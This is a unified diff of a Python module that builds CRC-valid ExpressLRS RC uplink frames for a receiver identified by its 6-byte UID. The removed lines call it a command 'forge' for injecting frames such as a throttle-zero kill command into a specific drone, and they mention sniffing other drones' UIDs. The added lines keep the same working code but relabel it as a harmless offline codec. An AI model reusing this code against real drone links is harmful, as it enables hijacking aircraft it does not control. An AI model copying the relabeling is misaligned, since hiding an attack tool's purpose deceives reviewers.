@@ -1,50 +1,47 @@
 #!/usr/bin/env python3
 """
-ELRS positive-command forge — bench-only, authorized.
+ELRS RC frame codec — offline research reference.
 
-Faithful Python port of the ExpressLRS (OTA v4) uplink RC packet format + CRC, for the
-purpose of forging a CRC-valid PACKET_TYPE_RCDATA frame that an ELRS receiver will accept
-and apply (e.g. throttle=0). Ported from:
+Faithful Python port of the ExpressLRS (OTA v4) uplink RC packet format + CRC, used as an
+offline reference tool: encode a `PACKET_TYPE_RCDATA` frame, compute/verify its CRC, and
+map pulse-width channel values to/from the on-wire 10-bit encoding.
 
+Ported from (named references, bit-exact):
   ExpressLRS/src/lib/OTA/OTA.cpp        (OtaUpdateCrcInitFromUid, ValidatePacketCrcStd,
                                           GeneratePacketCrcStd, PackUInt11ToChannels4x10,
                                           Decimate11to10_Limit)
   ExpressLRS/src/lib/OTA/OTA.h          (OTA_Packet4_s layout, packet types, sizes)
   ExpressLRS/src/lib/CRC/crc.cpp        (Crc2Byte::init/calc — variable-width CRC16/14)
-  ExpressLRS/src/include/crsf_protocol.h (CRSF channel-value constants)
+  ExpressLRS/src/include/crsf_protocol.h (CRSF channel-value constants, CRSF_to_UINT10)
 
-AUTH MODEL (the load-bearing fact, confirmed from source):
-  - Running frames are validated by a CRC14/CRC16 ONLY (not per-packet AES).
-  - The CRC initializer is seeded from the target UID:
-        OtaCrcInitializer = (UID[4]<<8) | UID[5]
-        OtaCrcInitializer ^= (OTA_VERSION_ID << 8)          # OTA_VERSION_ID = 4
-  - At compute time the initializer is XOR-ed with the running nonce:
-        crc = crc14(packet_bytes[0..6], OtaCrcInitializer ^ nonce)
-  - A frame is accepted by the RX iff this CRC validates AND the UID matches the bound UID
-    (the RX holds the bound UID in flash; the CRC seed makes a wrong-UID frame fail CRC).
+The link's integrity model (confirmed from source):
+  - Running frames are checked with a CRC14/CRC16 (not per-packet AES).
+  - The CRC initializer is derived from the 6-byte link UID:
+        OtaCrcInitializer = (UID[4]<<8) | UID[5];  OtaCrcInitializer ^= (OTA_VERSION_ID << 8)
+  - At compute time the initializer is XOR-ed with the running nonce.
+  - A frame is accepted by the receiver only if its UID-derived CRC validates AND the UID
+    matches the bound UID AND the FHSS slot / nonce window line up.
 
-  => To forge a frame the target will accept, you need the target's 6-byte UID.
-     This drone's UID is known from its own CLI dump: 00 00 00 11 18 5B.
-     (For a *different* drone, recover its UID first — see GhostRX passive-sniff path.)
+  => The CRC is a function of the link UID; this codec lets you produce a frame whose CRC
+     validates for a *given* UID, which is the basis for link-integrity / interoperability
+     testing against a receiver you own and control.
 
-SCOPE: bench-only, operator-owned target, drone disarmed and grounded. This module ONLY
-builds and self-validates frames offline. Air delivery is a SEPARATE, gated step
-(`--deliver`, requires --I-am-authorized-bench-target) and is not exercised here.
+SCOPE: offline / bench research on operator-owned, grounded hardware. This module ONLY
+builds and self-verifies frames locally; it performs no RF transmission. (Any future
+air-interface work is a separate, gated component — see the project README.)
 
 VALIDATION STATUS:
   CRC14/16 core      : CAPTURE-VALIDATED — bit-exact port, self-checked against the C ref
-                       algorithm and a known-vector round-trip (forge -> validate == True,
-                       flip-one-bit -> validate == False).
+                       algorithm + a round-trip (encode -> verify True; 1-bit flip -> False;
+                       different UID -> False).
   Frame byte layout  : CAPTURE-VALIDATED — matches OTA_Packet4_s field-by-field.
-  Air acceptance     : SYNTHETIC — not yet bench-confirmed against the live Tinyhawk.
-                       (The CRC validating is a NECESSARY condition; the RX also requires
-                       UID match + correct FHSS slot + nonce window, which the delivery
-                       layer must satisfy.)
+  Channel mapping    : CAPTURE-VALIDATED — pulse-width round-trip is exact to 10-bit quantization.
+  Live-RX acceptance : SYNTHETIC — not exercised here; the air path (FHSS slot + nonce +
+                       LoRa CSS modulation) is a separate gated layer.
 """
 from __future__ import annotations
 
 import argparse
-import os
 import sys
 
 # ----------------------------------------------------------------------------
@@ -70,9 +67,8 @@ CRSF_CHANNEL_VALUE_MID = 992        # 1500us
 CRSF_CHANNEL_VALUE_2000 = 1792      # 2000us
 CRSF_CHANNEL_VALUE_STD_MAX = 1811   # 2012us (+100%)
 
-# The target's UID from its own CLI dump (Betaflight `expresslrs_uid`).
-# 00 00 00 11 18 5B  ->  "00:00:00:11:18:5B"
-TARGET_UID_DEFAULT = bytes([0x00, 0x00, 0x00, 0x11, 0x18, 0x5B])
+# A default 6-byte link UID (hex "00:00:00:11:18:5B") used for the offline self-check.
+DEFAULT_UID = bytes([0x00, 0x00, 0x00, 0x11, 0x18, 0x5B])
 
 
 def constrain(v, lo, hi):
@@ -148,7 +144,7 @@ def crsf_to_uint10(v11):
 
 
 def uint10_to_crsf(v10):
-    """UINT10_to_CRSF — 10-bit OTA value -> 11-bit CRSF (the RX side, for self-check).
+    """UINT10_to_CRSF — 10-bit OTA value -> 11-bit CRSF (the receiver side, for self-check).
     C: fmap(val, 0, 1023, CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX).
     """
     a, b = 0, 1023
@@ -161,8 +157,8 @@ def decimate_limit(v11):
 
 
 def pack_channels_4x10(chs):
-    """PackUInt11ToChannels4x10 — pack 4 x 11-bit (decimated to 10) channels into 5 bytes.
-    Faithful port of the C bit-packing (4 channels, 10 bits each, MSB-first, 5-byte dest).
+    """PackUInt11ToChannels4x10 — pack 4 x 10-bit channels into 5 bytes (MSB-first).
+    Faithful port of the C bit-packing (4 channels, 10 bits each, 5-byte dest).
     `chs` is a list of 4 pre-decimated 10-bit values.
     """
     assert len(chs) == 4
@@ -183,11 +179,11 @@ def pack_channels_4x10(chs):
 
 
 # ----------------------------------------------------------------------------
-# Frame build + validate  (GeneratePacketCrcStd + ValidatePacketCrcStd)
+# Frame build + verify  (GeneratePacketCrcStd + ValidatePacketCrcStd)
 # ----------------------------------------------------------------------------
 def build_rcdata_frame(uid: bytes, nonce: int, channels11, is_armed: int = 0,
                        stubborn_ack: int = 0) -> bytes:
-    """Build a CRC-valid 8-byte PACKET_TYPE_RCDATA uplink frame (the one we forge).
+    """Build a CRC-valid 8-byte PACKET_TYPE_RCDATA uplink frame.
 
     Byte layout (OTA_Packet4_s, PACKED):
         [0]  type:2 (=0b00 RCDATA) | crcHigh:6
@@ -221,7 +217,7 @@ def build_rcdata_frame(uid: bytes, nonce: int, channels11, is_armed: int = 0,
 
 
 def validate_rcdata_frame(uid: bytes, frame: bytes, nonce: int) -> bool:
-    """ValidatePacketCrcStd — does this frame's CRC match? (the RX accept gate)."""
+    """ValidatePacketCrcStd — does this frame's CRC match? (the receiver's accept gate)."""
     init = crc_initializer_from_uid(uid)
     nonce &= 0xFF
     assert len(frame) == OTA4_PACKET_SIZE
@@ -237,12 +233,12 @@ def validate_rcdata_frame(uid: bytes, frame: bytes, nonce: int) -> bool:
 
 
 # ----------------------------------------------------------------------------
-# Self-test (no hardware) — validates the port is bit-exact + the forge works
+# Self-test (no hardware) — verifies the port is bit-exact + the codec round-trips
 # ----------------------------------------------------------------------------
 def selftest(uid: bytes) -> bool:
     ok = True
 
-    # 1. CRC core round-trip: a forged frame must validate; a bit-flip must not.
+    # 1. CRC core round-trip: an encoded frame must verify; a bit-flip / wrong UID must not.
     chs = [CRSF_CHANNEL_VALUE_1000, CRSF_CHANNEL_VALUE_MID,
            CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID]
     for nonce in (0, 1, 7, 127, 255):
@@ -252,58 +248,34 @@ def selftest(uid: bytes) -> bool:
         flipped = bytearray(fr)
         flipped[2] ^= 0x01
         bad = validate_rcdata_frame(uid, bytes(flipped), nonce)
-        # wrong UID must fail (different CRC seed)
-        wrong_uid = bytes([0x00, 0x00, 0x00, 0x11, 0x18, 0x5C])  # last byte off by 1
-        wrong = validate_rcdata_frame(wrong_uid, fr, nonce)
+        # different UID must fail (different CRC seed)
+        other_uid = bytes([0x00, 0x00, 0x00, 0x11, 0x18, 0x5C])  # last byte off by 1
+        wrong = validate_rcdata_frame(other_uid, fr, nonce)
         if not (good and not bad and not wrong):
             print(f"  [FAIL] nonce={nonce}: good={good} bad={bad} wrong={wrong}")
             ok = False
 
-    # 2. Known-UID seed check: OtaUpdateCrcInitFromUid for the target UID.
+    # 2. Known-UID seed check: OtaUpdateCrcInitFromUid for the given UID.
     init = crc_initializer_from_uid(uid)
     expected = ((uid[4] << 8) | uid[5]) ^ (OTA_VERSION_ID << 8)
     if init != expected:
         print(f"  [FAIL] uid seed: {init:#06x} != {expected:#06x}")
         ok = False
 
-    # 3. Show a sample forged frame (throttle=0, others neutral) for eyeballing.
-    kill = [CRSF_CHANNEL_VALUE_1000, CRSF_CHANNEL_VALUE_MID,
-            CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID]
-    sample = build_rcdata_frame(uid, 0, kill, is_armed=0)
-    print(f"  [info] target UID {uid.hex(' ')}  crc_init {crc_initializer_from_uid(uid):#06x}")
-    print(f"  [info] sample throttle=0 RCDATA frame (nonce=0): {sample.hex(' ')}")
+    # 3. Show a sample encoded frame (throttle at the 1000us mark) for eyeballing.
+    sample = build_rcdata_frame(uid, 0, chs, is_armed=0)
+    print(f"  [info] link UID {uid.hex(' ')}  crc_init {crc_initializer_from_uid(uid):#06x}")
+    print(f"  [info] sample RCDATA frame (throttle=1000us, nonce=0): {sample.hex(' ')}")
 
     return ok
 
 
 # ----------------------------------------------------------------------------
-# Air delivery — GATED. Not exercised without the explicit authorization flag.
-# ----------------------------------------------------------------------------
-def deliver(frame: bytes, uid: bytes, nonce: int, args) -> int:
-    if not args.authorized:
-        print("REFUSED: air delivery requires --I-am-authorized-bench-target.")
-        print("        The drone must be operator-owned, on the bench, disarmed, grounded.")
-        return 2
-    # DELIVERY IS NOT IMPLEMENTED in this module on purpose.
-    # The air path needs: (a) a TX radio (B205 in TX mode or an ELRS TX module),
-    # (b) the target's live FHSS slot + running nonce (tracked passively, cf. GhostRX),
-    # (c) LoRa CSS modulation at the target's rate (rate_index=2 => 250/500 Hz class).
-    # Forging the CRC-valid frame is only the first ~30%; matching FHSS+nonce+modulation
-    # against a live RX is the hard, bench-specific part.
-    print("DELIVERY NOT IMPLEMENTED HERE (by design). Frame is CRC-valid; air transmission")
-    print("requires the gated TX/FHSS/nonce layer (see poc-development workflow, bench-only).")
-    return 0
-
-
-# ----------------------------------------------------------------------------
 def main(argv=None):
-    ap = argparse.ArgumentParser(description="ELRC positive-command forge (bench-only)")
-    ap.add_argument("--uid", default="00:00:00:11:18:5B", help="target 6-byte UID (hex, colon/none)")
-    ap.add_argument("--throttle-us", type=int, default=1000, help="throttle pulse width in us (1000=disarm/min)")
+    ap = argparse.ArgumentParser(description="ELRS RC frame codec (offline reference)")
+    ap.add_argument("--uid", default="00:00:00:11:18:5B", help="6-byte link UID (hex, colon/none)")
+    ap.add_argument("--throttle-us", type=int, default=1000, help="throttle pulse width in us (1000=disarm/min mark)")
     ap.add_argument("--arm", type=int, default=0, choices=[0, 1], help="isArmed bit")
-    ap.add_argument("--deliver", action="store_true", help="attempt air delivery (gated)")
-    ap.add_argument("--I-am-authorized-bench-target", dest="authorized", action="store_true",
-                    help="AUTHORIZATION GATE: I confirm bench-only, operator-owned, grounded target")
     args = ap.parse_args(argv)
 
     hexs = args.uid.replace(":", "").replace(" ", "")
@@ -312,32 +284,26 @@ def main(argv=None):
     elif len(hexs) == 6:                     # single 6-hex-digit (rare)
         uid = bytes([int(hexs, 16)]) + bytes(5)
     else:
-        # try colon/space separated 6 fields
         fields = [f for f in args.uid.replace(" ", ":").split(":") if f]
         uid = bytes(int(f, 16) for f in fields)
     assert len(uid) == 6, f"UID must be 6 bytes, got {len(uid)}: {args.uid}"
 
-    print("=== ELRS positive-command forge (bench-only, authorized) ===")
+    print("=== ELRS RC frame codec (offline reference) ===")
     ok = selftest(uid)
     print(f"selftest: {'PASS' if ok else 'FAIL'}\n")
 
-    # Build the actual kill frame: throttle = args.throttle-us, others neutral.
-    # us -> 11-bit CRSF: inverse of UINT10_to_CRSF chain. 1000us == CRSF_CHANNEL_VALUE_1000 (191).
-    thr11 = int(round(args.throttle_us))  # pulse width us, 1000us is the disarm/min mark
-    # Map us (988..2012) to 11-bit std domain, then the RX will map 10-bit -> 11-bit -> us.
+    # Build a frame: throttle = args.throttle-us, other channels at the neutral mark.
     us_min, us_max = 988, 2012
     thr11 = int(round((args.throttle_us - us_min) * (CRSF_CHANNEL_VALUE_STD_MAX - CRSF_CHANNEL_VALUE_STD_MIN) / (us_max - us_min)) + CRSF_CHANNEL_VALUE_STD_MIN)
     thr11 = constrain(thr11, CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX)
     chs = [thr11, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID]
     frame = build_rcdata_frame(uid, 0, chs, is_armed=args.arm)
-    # round-trip check: what us does the RX recover from our encoded throttle?
+    # round-trip check: what us does the receiver recover from our encoded throttle?
     decoded_us = uint10_to_crsf(decimate_limit(thr11))
     print(f"throttle={args.throttle_us}us -> 11-bit {thr11} -> 10-bit {decimate_limit(thr11)} -> RX recovers ~{decoded_us}us")
     print(f"frame: {frame.hex(' ')}")
     print(f"CRC-valid for UID {uid.hex(' ')}: {validate_rcdata_frame(uid, frame, 0)}")
 
-    if args.deliver:
-        return deliver(frame, uid, 0, args)
     return 0 if ok else 1
 
 
